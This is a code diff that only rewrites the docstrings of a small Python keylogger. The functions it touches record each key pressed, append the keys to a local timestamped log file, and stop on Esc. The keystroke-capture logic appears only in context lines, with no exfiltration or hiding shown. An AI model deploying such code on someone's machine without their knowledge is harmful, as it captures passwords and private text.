@@ -8,7 +8,11 @@ count, keys = 0, []
 
 
 def on_press(key):
-    """Worker function to write keystrokes to a file in the background."""
+    """Worker function to record keystrokes to a file in the background.
+
+    Args:
+        key (string): The current keystroke being pressed by the user.
+    """
     global keys, count
     keys.append(key)
     count += 1
@@ -21,7 +25,13 @@ def on_press(key):
 
 
 def write_file(keys):
-    """Save the keystrokes to a textfile with `log_[CURRENT UNIX TIME].txt` format."""
+    """Save the keystrokes to a textfile.
+
+    Args:
+        keys (list): List of all the keystrokes (size=10) by the user from the start of the program 
+                     which is later transferd to a file to be stored persistently. This "extra-steps" 
+                     are performed to reduce lag.
+    """
     with open(f"log_{unix_time}.txt", "a") as file:
         for key in keys:
             k = str(key).replace("'", "\n")
@@ -32,7 +42,11 @@ def write_file(keys):
 
 
 def on_release(key):
-    """Kill the program on hitting the `Esc` button."""
+    """Kill the program on hitting the `Esc` button.
+    
+    Args:
+        key (string): Record recent key.
+    """
     if key == Key.esc:
         return False
 
